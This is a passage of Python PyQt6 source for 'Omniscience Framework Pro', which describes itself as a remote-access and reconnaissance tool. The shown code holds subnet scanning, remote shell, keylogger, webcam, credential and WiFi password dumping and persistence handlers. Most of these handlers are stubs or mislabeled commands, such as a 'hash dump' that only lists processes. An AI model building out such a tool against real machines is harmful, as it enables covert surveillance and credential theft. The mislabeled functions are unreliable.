        btn_wifi = QPushButton("📶 WiFi Passwords")
        btn_wifi.clicked.connect(self.dump_wifi_creds)
        btn_layout.addWidget(btn_wifi)
        
        btn_export = QPushButton("💾 Export")
        btn_export.clicked.connect(self.export_credentials)
        btn_layout.addWidget(btn_export)
        
        layout.addLayout(btn_layout)
        
        return widget

    def create_settings_tab(self):
        """Create settings tab"""
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        title = QLabel("◈ SETTINGS")
        title.setStyleSheet(f"color: {TEXT}; font-size: 20px; font-weight: bold; font-family: Consolas;")
        layout.addWidget(title)
        
        # Settings categories
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll_content = QWidget()
        scroll_layout = QVBoxLayout(scroll_content)
        
        # Network settings
        network_group = QGroupBox("Network Settings")
        network_group.setStyleSheet(self.get_group_style())
        network_layout = QFormLayout(network_group)
        
        self.timeout_input = QSpinBox()
        self.timeout_input.setRange(1, 60)
        self.timeout_input.setValue(5)
        network_layout.addRow("Timeout (s):", self.timeout_input)
        
        self.threads_input = QSpinBox()
        self.threads_input.setRange(1, 100)
        self.threads_input.setValue(10)
        network_layout.addRow("Threads:", self.threads_input)
        
        self.msg_port = QSpinBox()
        self.msg_port.setRange(1024, 65535)
        self.msg_port.setValue(9999)
        network_layout.addRow("Msg Port:", self.msg_port)
        
        scroll_layout.addWidget(network_group)
        
        # Display settings
        display_group = QGroupBox("Display Settings")
        display_group.setStyleSheet(self.get_group_style())
        display_layout = QFormLayout(display_group)
        
        self.dark_mode = QCheckBox("Dark Mode")
        self.dark_mode.setChecked(True)
        display_layout.addRow("", self.dark_mode)
        
        scroll_layout.addWidget(display_group)
        
        # Logging settings
        log_group = QGroupBox("Logging")
        log_group.setStyleSheet(self.get_group_style())
        log_layout = QFormLayout(log_group)
        
        self.log_level = QComboBox()
        self.log_level.addItems(["DEBUG", "INFO", "WARNING", "ERROR"])
        log_layout.addRow("Log Level:", self.log_level)
        
        self.log_file = QCheckBox("Log to File")
        self.log_file.setChecked(True)
        log_layout.addRow("", self.log_file)
        
        scroll_layout.addWidget(log_group)
        
        scroll.setWidget(scroll_content)
        layout.addWidget(scroll)
        
        # Save button
        btn_save = QPushButton("💾 SAVE SETTINGS")
        btn_save.setStyleSheet(f"""
            QPushButton {{
                background-color: {SUCCESS};
                color: {DARK_BG};
                padding: 12px;
                font-weight: bold;
                font-family: Consolas;
                border-radius: 5px;
            }}
        """)
        btn_save.clicked.connect(self.save_settings)
        layout.addWidget(btn_save)
        
        return widget

    def create_menu_bar(self):
        """Create menu bar"""
        menubar = self.menuBar()
        
        # File menu
        file_menu = menubar.addMenu("File")
        
        new_action = QAction("New Session", self)
        file_menu.addAction(new_action)
        
        open_action = QAction("Open...", self)
        file_menu.addAction(open_action)
        
        file_menu.addSeparator()
        
        exit_action = QAction("Exit", self)
        exit_action.triggered.connect(self.close)
        file_menu.addAction(exit_action)
        
        # Tools menu
        tools_menu = menubar.addMenu("Tools")
        
        scan_action = QAction("Network Scanner", self)
        scan_action.triggered.connect(self.quick_scan)
        tools_menu.addAction(scan_action)
        
        exploit_action = QAction("Exploit Database", self)
        tools_menu.addAction(exploit_action)
        
        # Help menu
        help_menu = menubar.addMenu("Help")
        
        about_action = QAction("About", self)
        about_action.triggered.connect(self.show_about)
        help_menu.addAction(about_action)

    def apply_dark_theme(self):
        """Apply futuristic cyberpunk dark theme with gradients"""
        self.setStyleSheet(f"""
            QMainWindow {{
                background-color: {DARK_BG};
                background-image: qlineargradient(x1:0, y1:0, x2:1, y2:1,
                    stop:0 {GRADIENT_START}, 
                    stop:0.5 {GRADIENT_MID}, 
                    stop:1 {GRADIENT_END});
            }}
            QTabWidget::pane {{
                border: 2px solid {ACCENT};
                border-radius: 10px;
                background-color: rgba(10, 10, 20, 200);
            }}
            QTabBar::tab {{
                background-color: {DARKER_BG};
                color: {TEXT_DIM};
                padding: 12px 20px;
                border: none;
                border-top-left-radius: 8px;
                border-top-right-radius: 8px;
                margin-right: 2px;
                font-family: 'Consolas', 'Courier New';
                font-weight: bold;
            }}
            QTabBar::tab:selected {{
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 {ACCENT}, stop:1 {PURPLE});
                color: {DARKER_BG};
                border-bottom: 3px solid {ACCENT3};
            }}
            QTabBar::tab:hover {{
                background-color: {DARK_BG};
                color: {ACCENT};
            }}
            QPushButton {{
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 {ACCENT}, stop:1 {PURPLE});
                color: {DARKER_BG};
                border: none;
                padding: 10px 20px;
                border-radius: 5px;
                font-family: 'Consolas';
                font-weight: bold;
                text-transform: uppercase;
                letter-spacing: 1px;
            }}
            QPushButton:hover {{
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 {ACCENT3}, stop:1 {ACCENT});
                box-shadow: 0 0 15px {ACCENT};
            }}
            QPushButton:pressed {{
                background: {ACCENT2};
                transform: scale(0.98);
            }}
            QLineEdit {{
                background-color: {DARKER_BG};
                color: {ACCENT};
                border: 2px solid {TEXT_DIM};
                padding: 8px;
                border-radius: 5px;
                font-family: 'Consolas';
            }}
            QLineEdit:focus {{
                border-color: {ACCENT};
                box-shadow: 0 0 10px {ACCENT};
            }}
            QGroupBox {{
                color: {ACCENT};
                border: 2px solid {TEXT_DIM};
                border-radius: 8px;
                margin-top: 15px;
                padding-top: 15px;
                font-family: 'Consolas';
                font-weight: bold;
                background-color: rgba(10, 10, 30, 150);
            }}
            QGroupBox::title {{
                subcontrol-origin: margin;
                subcontrol-position: top left;
                padding: 0 10px;
                color: {ACCENT};
                text-shadow: 0 0 10px {ACCENT};
            }}
            QListWidget {{
                background-color: {DARKER_BG};
                color: {TEXT};
                border: 1px solid {TEXT_DIM};
                border-radius: 5px;
                font-family: 'Consolas';
            }}
            QListWidget::item:selected {{
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 {ACCENT2}, stop:1 {PURPLE});
                color: white;
                border-radius: 3px;
            }}
            QTableWidget {{
                background-color: {DARKER_BG};
                color: {TEXT};
                gridline-color: {TEXT_DIM};
                border: 1px solid {TEXT_DIM};
                border-radius: 5px;
                font-family: 'Consolas';
            }}
            QTableWidget::item:selected {{
                background-color: {ACCENT};
                color: {DARKER_BG};
            }}
            QHeaderView::section {{
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 {DARKER_BG}, stop:1 {DARK_BG});
                color: {ACCENT};
                padding: 8px;
                border: none;
                border-bottom: 2px solid {ACCENT};
                font-weight: bold;
            }}
            QScrollBar:vertical {{
                background-color: {DARKER_BG};
                width: 14px;
                border-radius: 7px;
            }}
            QScrollBar::handle:vertical {{
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 {ACCENT}, stop:1 {PURPLE});
                border-radius: 7px;
                min-height: 30px;
            }}
            QScrollBar::handle:vertical:hover {{
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 {ACCENT3}, stop:1 {ACCENT});
                box-shadow: 0 0 10px {ACCENT};
            }}
            QLabel {{
                color: {TEXT};
                font-family: 'Consolas';
            }}
            QMenuBar {{
                background-color: {DARKER_BG};
                color: {TEXT};
                font-family: 'Consolas';
                border-bottom: 2px solid {ACCENT};
            }}
            QMenuBar::item:selected {{
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 {ACCENT}, stop:1 {PURPLE});
                color: {DARKER_BG};
            }}
            QMenu {{
                background-color: {DARKER_BG};
                color: {TEXT};
                border: 1px solid {ACCENT};
                border-radius: 5px;
                font-family: 'Consolas';
            }}
            QMenu::item:selected {{
                background-color: {ACCENT};
                color: {DARKER_BG};
            }}
            QTextEdit {{
                background-color: {DARKER_BG};
                color: {TEXT};
                border: 1px solid {TEXT_DIM};
                border-radius: 5px;
                font-family: 'Consolas';
            }}
            QProgressBar {{
                background-color: {DARKER_BG};
                border: 2px solid {ACCENT};
                border-radius: 10px;
                text-align: center;
                color: {ACCENT};
                font-family: 'Consolas';
                font-weight: bold;
            }}
            QProgressBar::chunk {{
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 {ACCENT}, stop:0.5 {ACCENT3}, stop:1 {ACCENT});
                border-radius: 8px;
            }}
            QSpinBox, QComboBox {{
                background-color: {DARKER_BG};
                color: {TEXT};
                border: 1px solid {TEXT_DIM};
                border-radius: 5px;
                padding: 5px;
                font-family: 'Consolas';
            }}
            QSpinBox:focus, QComboBox:focus {{
                border-color: {ACCENT};
                box-shadow: 0 0 5px {ACCENT};
            }}
            QCheckBox {{
                color: {TEXT};
                font-family: 'Consolas';
            }}
            QCheckBox::indicator:checked {{
                background-color: {ACCENT};
                border: 2px solid {ACCENT};
            }}
        """)
        
        # Add custom CSS for animations via stylesheet
        self.setStyleSheet(self.styleSheet() + f"""
            QPushButton[class="scan"] {{
                animation: pulse 2s infinite;
            }}
            @keyframes pulse {{
                0% {{ box-shadow: 0 0 0 0 {ACCENT}; }}
                70% {{ box-shadow: 0 0 0 10px transparent; }}
                100% {{ box-shadow: 0 0 0 0 transparent; }}
            }}
            QLabel[class="title"] {{
                text-shadow: 0 0 20px {ACCENT};
            }}
        """)

    # ============== ACTION METHODS ==============
    
    def load_system_info(self):
        """Load system information on startup"""
        try:
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            self.log_activity(f"System initialized - Hostname: {hostname}, IP: {local_ip}")
            
            # Add local node to network
            local_node = NetworkNode(local_ip, hostname, "", platform.system(), [], "online", "gateway")
            self.network_scene.add_node(local_node)
        except:
            pass

    def update_network_monitor(self):
        """Update real-time network connections"""
        try:
            result = subprocess.run("netstat -ano", shell=True, capture_output=True, text=True)
            lines = result.stdout.split('\n')
            
            # Update connections table
            self.connections_table.setRowCount(0)
            conn_count = 0
            
            for line in lines[4:]:  # Skip header
                if 'ESTABLISHED' in line or 'LISTENING' in line:
                    parts = line.split()
                    if len(parts) >= 5:
                        row = self.connections_table.rowCount()
                        self.connections_table.insertRow(row)
                        local_addr = parts[1] if len(parts) > 1 else ""
                        remote_addr = parts[2] if len(parts) > 2 else ""
                        status = parts[3] if len(parts) > 3 else ""
                        pid = parts[4] if len(parts) > 4 else ""
                        
                        self.connections_table.setItem(row, 0, QTableWidgetItem(local_addr))
                        self.connections_table.setItem(row, 1, QTableWidgetItem(remote_addr))
                        self.connections_table.setItem(row, 2, QTableWidgetItem("TCP"))
                        self.connections_table.setItem(row, 3, QTableWidgetItem(status))
                        self.connections_table.setItem(row, 4, QTableWidgetItem(pid))
                        conn_count += 1
            
            self.connections_count.setText(str(conn_count))
        except:
            pass

    def quick_scan(self):
        """Perform quick network scan - auto detect all IPs on local and external networks"""
        self.log_activity("Starting comprehensive network scan...")
        self.scan_progress.setVisible(True)
        
        # Get all network ranges (local + common external)
        targets = []
        
        try:
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            parts = local_ip.split('.')
            
            # Local subnet scan (192.168.x.x)
            local_subnet = f"{parts[0]}.{parts[1]}.{parts[2]}"
            targets.extend([f"{local_subnet}.{i}" for i in range(1, 255)])
            
            # Also try common private ranges
            for subnet_prefix in ["10.0.0", "172.16.0", "192.168.0", "192.168.1", "192.168.2"]:
                if subnet_prefix != local_subnet:
                    targets.extend([f"{subnet_prefix}.{i}" for i in range(1, 255)])
                    
            # Add default gateway
            try:
                result = subprocess.run("ipconfig", shell=True, capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if "Default Gateway" in line:
                        gateway = line.split(":")[-1].strip()
                        if gateway and gateway != "":
                            targets.append(gateway)
            except:
                pass
                
        except:
            # Fallback to common ranges
            targets.extend([f"192.168.1.{i}" for i in range(1, 255)])
        
        self.log_activity(f"Scanning {len(targets)} potential targets (local + external networks)")
        
        # Start scan with more targets
        self.scanner = ScannerThread(targets[:500])  # Increased limit for better detection
        self.scanner.progress.connect(self.update_scan_progress)
        self.scanner.host_found.connect(self.add_discovered_host)
        self.scanner.connection_found.connect(self.add_connection)
        self.scanner.finished.connect(self.scan_finished)
        self.scanner.start()
        
        # Also scan for external IPs (internet-connected devices via common ports)
        threading.Thread(target=self.scan_external_ranges, daemon=True).start()
    
    def scan_external_ranges(self):
        """Scan external network ranges for internet-connected devices"""
        external_ranges = [
            # Common ranges to scan (limited for performance)
            # In real scenario, you'd scan more ranges
        ]
        
        # Scan for common external-facing services
        common_ips = [
            "8.8.8.8",  # Google DNS
            "1.1.1.1",  # Cloudflare
            "208.67.222.222",  # OpenDNS
        ]
        
        for ip in common_ips:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((ip, 443))
                if result == 0:
                    self.log_activity(f"External host reachable: {ip}:443")
                sock.close()
            except:
                pass

    def full_scan(self):
        """Perform full network scan"""
        self.log_activity("Starting full network scan...")
        self.scan_progress.setVisible(True)
        
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        parts = local_ip.split('.')
        targets = [f"{parts[0]}.{parts[1]}.{parts[2]}.{i}" for i in range(1, 255)]
        
        self.scanner = ScannerThread(targets)
        self.scanner.progress.connect(self.update_scan_progress)
        self.scanner.host_found.connect(self.add_discovered_host)
        self.scanner.connection_found.connect(self.add_connection)
        self.scanner.finished.connect(self.scan_finished)
        self.scanner.start()

    def update_scan_progress(self, value, message):
        """Update scan progress"""
        self.scan_progress.setValue(value)
        self.status_bar.showMessage(message)

    def add_discovered_host(self, host_info):
        """Add discovered host to lists"""
        self.hosts.append(host_info)
        
        # Add to table
        row = self.hosts_table.rowCount()
        self.hosts_table.insertRow(row)
        self.hosts_table.setItem(row, 0, QTableWidgetItem(host_info["ip"]))
        self.hosts_table.setItem(row, 1, QTableWidgetItem(host_info["hostname"]))
        self.hosts_table.setItem(row, 2, QTableWidgetItem(host_info["mac"]))
        self.hosts_table.setItem(row, 3, QTableWidgetItem(host_info.get("vendor", "Unknown")))
        self.hosts_table.setItem(row, 4, QTableWidgetItem(host_info.get("os", "Unknown")))
        self.hosts_table.setItem(row, 5, QTableWidgetItem(host_info["status"]))
        self.hosts_table.setItem(row, 6, QTableWidgetItem(", ".join(map(str, host_info["ports"]))))
        
        # Add to network topology
        node = NetworkNode(
            host_info["ip"],
            host_info["hostname"],
            host_info["mac"],
            host_info.get("os", ""),
            host_info["ports"],
            host_info["status"],
            "server" if host_info["ports"] else "host",
            host_info.get("vendor", "")
        )
        self.network_scene.add_node(node)
        
        # Update stats
        online = sum(1 for h in self.hosts if h["status"] == "online")
        self.hosts_online.setText(str(online))
        
        self.log_activity(f"Host discovered: {host_info['ip']} ({host_info.get('vendor', 'N/A')}) - {host_info.get('os', 'Unknown')}")

    def add_connection(self, ip, protocol, port):
        """Add connection to network visualization"""
        try:
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            self.network_scene.add_edge(local_ip, ip, protocol, int(port))
        except:
            pass

    def scan_finished(self):
        """Handle scan completion"""
        self.scan_progress.setVisible(False)
        self.status_bar.showMessage(f"Scan complete - {len(self.hosts)} hosts found")
        self.log_activity(f"Network scan completed. Found {len(self.hosts)} hosts.")

    def refresh_topology(self):
        """Refresh network topology"""
        self.network_scene.update_positions()

    def export_topology(self):
        """Export network topology"""
        filename, _ = QFileDialog.getSaveFileName(self, "Export Topology", "", "JSON Files (*.json)")
        if filename:
            data = [{"ip": h["ip"], "hostname": h["hostname"], "mac": h["mac"], "vendor": h.get("vendor", ""), "status": h["status"], "ports": h["ports"]} for h in self.hosts]
            with open(filename, 'w') as f:
                json.dump(data, f, indent=2)
            self.log_activity(f"Topology exported to {filename}")

    # ============== CLI METHODS ==============
    
    def execute_cli_input(self):
        """Execute CLI input"""
        cmd = self.cli_input.text().strip()
        if not cmd:
            return
            
        # Add to history
        self.command_history.append(cmd)
        self.history_index = len(self.command_history)
        
        # Display command
        self.cli_output.append(f"\n► {cmd}")
        
        # Execute
        self.cli_input.clear()
        result = self.cli.execute(cmd)
        
        if result == "CLEAR":
            self.cli_output.clear()
        elif result == "EXIT":
            self.close()
        else:
            self.cli_output.append(result)
        
        # Scroll to bottom
        self.cli_output.verticalScrollBar().setValue(self.cli_output.verticalScrollBar().maximum())

    def show_cli_help(self):
        """Show CLI help"""
        result = self.cli.show_help()
        self.cli_output.append(result)

    def execute_quick_command(self):
        """Execute quick command from dashboard"""
        cmd = self.quick_cmd.text().strip()
        if cmd:
            result = self.cli.execute(cmd)
            if result == "CLEAR":
                self.activity_log.clear()
            elif result and result != "EXIT":
                self.activity_log.append(result)
            self.quick_cmd.clear()

    def launch_external_terminal(self):
        """Open the advanced standalone CLI window"""
        self.external_shell = OmniSecCLIWindow(self.cli)
        self.external_shell.show()
        self.log_activity("External advanced shell initiated.")

    # ============== SESSION METHODS ==============
    
    def new_session(self):
        """Create new session"""
        text, ok = QInputDialog.getText(self, "New Session", "Enter target IP:")
        if ok and text:
            self.cli.connect_target([text])
            self.log_activity(f"Session created: {text}")
            self.refresh_sessions()

    def interact_session(self):
        """Interact with session"""
        self.log_activity("Opening session interaction...")

    def kill_session(self):
        """Kill session"""
        self.log_activity("Kill session")

    def refresh_sessions(self):
        """Refresh sessions table"""
        self.sessions_table.setRowCount(0)
        for sid, sess in self.cli.sessions.items():
            row = self.sessions_table.rowCount()
            self.sessions_table.insertRow(row)
            self.sessions_table.setItem(row, 0, QTableWidgetItem(sid[:8]))
            self.sessions_table.setItem(row, 1, QTableWidgetItem(sess.get('ip', 'N/A')))
            self.sessions_table.setItem(row, 2, QTableWidgetItem(sess.get('platform', 'unknown')))
            self.sessions_table.setItem(row, 3, QTableWidgetItem(sess.get('user', 'N/A')))
            self.sessions_table.setItem(row, 4, QTableWidgetItem(sess.get('status', 'active')))
            self.sessions_table.setItem(row, 5, QTableWidgetItem(sess.get('created', 'N/A')))
        
        self.sessions_count.setText(str(len(self.cli.sessions)))

    # ============== MESSAGE METHODS ==============
    
    def send_message(self):
        """Send message to target PC"""
        target = self.msg_target.text().strip()
        message = self.msg_text.text().strip()
        
        if target and message:
            result = self.cli.send_message([target, message])
            self.log_activity(f"Message sent to {target}: {message}")
            self.msg_text.clear()
            
            # Also send via network
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                msg_data = json.dumps({
                    'from': 'self',
                    'to': target,
                    'message': message,
                    'time': datetime.now().strftime("%H:%M:%S")
                })
                sock.sendto(msg_data.encode(), (target, 9999))
                sock.close()
            except:
                pass

    def on_message_received(self, from_ip, to_ip, message):
        """Handle received message"""
        self.log_activity(f"Message from {from_ip}: {message}")
        
        # Add to inbox
        self.inbox_list.addItem(f"{from_ip}: {message[:50]}...")
        self.messages_count.setText(str(self.inbox_list.count()))

    def show_send_message(self):
        """Show send message dialog"""
        self.tabs.setCurrentIndex(4)  # Messages tab

    # ============== CONTROL METHODS ==============
    
    def connect_to_target(self):
        """Connect to target PC"""
        ip = self.target_ip.text().strip()
        user = self.target_user.text().strip()
        password = self.target_pass.text().strip()
        
        if ip:
            self.cli.connect_target([ip, "445"])
            if user:
                self.cli.add_credential([ip, user, password])
            self.log_activity(f"Connected to {ip}")
            self.control_output.append(f"[*] Connected to {ip}")
            self.refresh_sessions()

    def remote_shell(self):
        """Remote shell"""
        target = self.target_ip.text().strip() or self.cli.current_target
        if target:
            text, ok = QInputDialog.getText(self, "Remote Shell", "Enter command:")
            if ok and text:
                result = self.cli.shell(text.split())
                self.control_output.append(result)

    def take_screenshot(self):
        """Take screenshot"""
        result = self.cli.screenshot([])
        self.control_output.append(result)
        self.log_activity("Screenshot taken")

    def capture_webcam(self):
        """Capture webcam"""
        result = self.cli.webcam([])
        self.control_output.append(result)

    def dump_hashes(self):
        """Dump hashes"""
        self.control_output.append("[*] Hash dump initiated...")
        result = self.cli.run_command("powershell -Command \"Get-Process | Select-Object Name, Id\"")
        self.control_output.append(result)
        self.log_activity("Hash dump requested")

    def get_clipboard(self):
        """Get clipboard"""
        result = self.cli.clipboard(["get"])
        self.control_output.append(result)

    def start_keylogger(self):
        """Start keylogger"""
        result = self.cli.keylogger(["start"])
        self.control_output.append(result)
        self.log_activity("Keylogger started")

    def list_processes(self):
        """List processes"""
        result = self.cli.list_processes([])
        self.control_output.append(result)

    def list_services_cmd(self):
        """List services"""
        result = self.cli.list_services([])
        self.control_output.append(result)

    def auto_pwn(self):
        """Auto pwn"""
        self.log_activity("Auto-pwn initiated")

    # ============== EXPLOIT METHODS ==============
    
    def run_exploit(self):
        target = self.target_input.text()
        if target:
            self.log_activity(f"Running exploit against {target}")
            self.control_output.append(f"[*] Exploiting {target}...")
        else:
            QMessageBox.warning(self, "Warning", "Please enter target IP")

    def check_exploit(self):
        target = self.target_input.text()
        if target:
            self.log_activity(f"Checking exploit for {target}")
        else:
            QMessageBox.warning(self, "Warning", "Please enter target IP")

    # ============== PERSISTENCE METHODS ==============
    
    def install_persistence(self):
        self.log_activity("Installing persistence...")

    def remove_persistence(self):
        self.log_activity("Removing persistence...")

    # ============== CREDENTIALS METHODS ==============
    
    def dump_credentials(self):
        self.log_activity("Dumping all credentials...")
        self.control_output.append("[*] Dumping credentials...")
        result = self.cli.run_command("powershell -Command \"Get-Process | Select-Object Name, Id\"")
        self.control_output.append(result)

    def dump_browser_creds(self):
        self.log_activity("Dumping browser credentials...")

    def dump_wifi_creds(self):
        self.log_activity("Dumping WiFi passwords...")
        result = self.cli.run_command("netsh wlan show profiles")
        self.control_output.append(result)

    def export_credentials(self):
        filename, _ = QFileDialog.getSaveFileName(self, "Export Credentials", "", "CSV Files (*.csv)")
        if filename:
            self.log_activity(f"Credentials exported to {filename}")

    # ============== UTILITY METHODS ==============
    
    def log_activity(self, message):
        """Log activity to activity log"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.activity_log.append(f"[{timestamp}] {message}")
        self.activity_log.verticalScrollBar().setValue(self.activity_log.verticalScrollBar().maximum())

    def show_about(self):
        """Show about dialog"""
        QMessageBox.about(self, "About Omniscience Framework Pro",
            "◈ OMNISCIENCE FRAMEWORK PRO v2.0 ◈\n\n"
            "Advanced Network Reconnaissance & Remote Access Platform\n\n"
            "Features:\n"
            "• Real Network Visualization\n"
            "• 140+ CLI Commands\n"
            "• PC-to-PC Messaging\n"
            "• Full Remote Control\n"
            "• Session Management\n"
            "• Credential Harvesting\n"
            "• Persistence Mechanisms\n\n"
            "© 2024-2025 Omniscience Team")

    def save_settings(self):
        self.log_activity("Settings saved")
        QMessageBox.information(self, "Settings", "Settings saved successfully!")

    def closeEvent(self, event):
        """Clean up on close"""
        if hasattr(self, 'msg_server'):
            self.msg_server.stop()
        if hasattr(self, 'cli') and hasattr(self.cli, 'intel'):
            self.cli.intel.stop_sniffing()
        event.accept()


# ==================== STANDALONE CLI ====================

class StandaloneCLI:
    """Standalone CLI that works without GUI"""
    
    def __init__(self):
        self.cli = CLIManager()
        self.running = True
        
    def run(self):
        import sys
        print("""
+==========================================================================+
|                                                                       |
|           OMNISCIENCE FRAMEWORK PRO - STANDALONE CLI v2.0            |
|                                                                       |
|  This is the standalone CLI version. Works without GUI!              |
|  Type 'help' for all commands or 'exit' to quit.                     |
|                                                                       |
+==========================================================================+
""", flush=True)
        
        while self.running:
            try:
                cmd = input("\nOmniscience> ")
                if cmd.strip():
                    result = self.cli.execute(cmd)
                    if result == "EXIT":
                        self.running = False
                    elif result and result != "CLEAR":
                        print(result, flush=True)
            except KeyboardInterrupt:
                print("\n[*] Use 'exit' to quit", flush=True)
            except EOFError:
                break
        
        print("[*] Goodbye!", flush=True)


def main():
    """Main entry point"""
    # Check if GUI should be used
    use_gui = '--cli' not in sys.argv
    
    if use_gui:
        # GUI mode
        try:
            from PyQt6.QtWidgets import QApplication
            app = QApplication(sys.argv)
            app.setApplicationName("Omniscience Framework Pro")
            
            window = OmniscienceProGUI()
            window.show()
            
            sys.exit(app.exec())
        except ImportError:
            print("[!] PyQt6 not installed. Install with: pip install PyQt6")
            print("[!] Falling back to standalone CLI...")
            use_gui = False    
    if not use_gui:
        # Standalone CLI mode
        cli = StandaloneCLI()
        cli.run()

if __name__ == "__main__":
    main()
